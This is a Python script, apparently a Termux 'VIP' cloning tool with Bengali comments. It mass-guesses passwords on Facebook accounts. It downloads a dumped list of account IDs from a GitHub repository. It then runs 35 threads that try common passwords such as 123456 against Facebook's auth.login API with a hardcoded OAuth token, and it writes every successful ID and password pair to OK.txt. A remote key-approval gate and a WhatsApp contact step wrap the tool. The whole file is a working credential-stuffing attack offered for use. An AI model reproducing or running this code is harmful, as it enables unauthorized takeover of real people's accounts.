import os, time, random, sys, requests, uuid

#--- [ COLORS ] ---#
G = '\033[1;92m' 
Y = '\033[1;93m' 
W = '\033[1;97m' 
R = '\033[1;91m'

loop, oks = 0, []

#--- [ KEY APPROVAL SYSTEM ] ---#
def approval():
    os.system('clear')
    # ইউজার ডিভাইসের আইডি এবং হার্ডওয়্যার আইডি দিয়ে ইউনিক কী
    try:
        device_id = os.getlogin().upper()
    except:
        device_id = "SHAHIN"
    
    # এটি ইউজারের জন্য একটি ফিক্সড ইউনিক কী তৈরি করবে
    unique_id = str(uuid.getnode())[:6]
    key = f"SHAHIN-VIP-{device_id}-{unique_id}"
    
    # আপনার গিটহাব লিঙ্ক (Raw Link)
    approval_url = "https://raw.githubusercontent.com/w8Shahin/Approval-control/refs/heads/main/Keys.txt"
    
    print(f"{G} [•] WELCOME TO SHAHIN VIP TOOL")
    print(f"{W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    try:
        active_keys = requests.get(approval_url).text
        if key in active_keys:
            print(f" {G}[√] ACCESS GRANTED! WELCOME BOSS")
            time.sleep(2)
            Main()
        else:
            print(f" {R}[×] STATUS : NOT APPROVED")
            print(f" {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            print(f" {W}[•] YOUR KEY : {G}{key}") # এখানে ইউজার তার কী দেখতে পাবে
            print(f" {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            print(f" {Y}[!] এই কী (Key) টি কপি করে এডমিনকে পাঠান।")
            input(f"\n {G}[ENTER] করলে হোয়াটসঅ্যাপে মেসেজ যাবে...")
            # আপনার নম্বরটি বসিয়ে নিন
            os.system(f'termux-open-url "https://wa.me/+8801XXXXXXXXX?text=Assalamu%20Alaikum%20Admin,%20Approve%20My%20Key:%20{key}"')
            sys.exit()
    except:
        print(f" {R}[!] Network Error! Check Internet Connection."); sys.exit()

def logo():
    os.system('clear')
    print(f'''{G}
 ███████ ██   ██  █████  ██   ██ ██ ███    ██ 
 ██      ██   ██ ██   ██ ██   ██ ██ ████   ██ 
 ███████ ███████ ███████ ███████ ██ ██ ██  ██ 
      ██ ██   ██ ██   ██ ██   ██ ██ ██  ██ ██ 
 ███████ ██   ██ ██   ██ ██   ██ ██ ██   ████ {Y}V21{W}''')
    print(f' {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def Main():
    logo()
    print(f' {G}[1]{W} CLONE OLD ACTIVE IDS (ONLINE DUMP)')
    print(f' {G}[2]{W} CLONE FROM FILE')
    print(f' {G}[0]{W} EXIT')
    opt = input(f'\n {W}[•] CHOOSE : {G}')
    if opt == '1': online_dump()
    elif opt == '2': file_crack()
    else: sys.exit()

def online_dump():
    logo()
    print(f" {W}[•] Downloading Active IDs...")
    url = "https://raw.githubusercontent.com/Social-Engineer-Tool/dumps/main/bd_old_ids.txt"
    try:
        data = requests.get(url).text
        with open('dump.txt', 'w') as f: f.write(data)
        start_cloning('dump.txt')
    except: print(f" {R}Download Failed!"); time.sleep(2); Main()

def start_cloning(file_path):
    try:
        ids = open(file_path, 'r').read().splitlines()
    except: print(f" {R}File Error!"); time.sleep(2); Main()
    
    logo()
    print(f" {W}[•] TOTAL TARGET : {len(ids)}")
    print(f" {W}[•] PASS : 123456, 1234567, 123456789")
    print(f" {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    with ThreadPool(max_workers=35) as engine:
        for user in ids:
            uid = user.split('|')[0]
            pws = ['123456', '1234567', '12345678', '123456789', '112233', '55667788', '572737']
            engine.submit(crack_engine, uid, pws, len(ids))

def crack_engine(uid, pws, limit):
    global loop, oks
    ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
    for pw in pws:
        session = requests.Session()
        headers = {'User-Agent': ua, 'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
        data = {'email': uid, 'password': pw, 'format': 'json'}
        try:
            res = session.post('https://b-api.facebook.com/method/auth.login', data=data, headers=headers).json()
            if 'session_key' in res:
                print(f'\r\r{G}[SHAHIN-OK] {uid} | {pw}{W}')
                oks.append(uid)
                open('OK.txt', 'a').write(uid+'|'+pw+'\n')
                break
            elif 'checkpoint' in str(res):
                break
        except:
            pass # এখানে except যোগ করা হয়েছে যাতে SyntaxError না হয়
            
    loop += 1
    sys.stdout.write(f'\r\r {W}[CLONING] {loop}/{limit} OK:{G}{len(oks)}{W}'); sys.stdout.flush()

if __name__ == "__main__":
    approval()
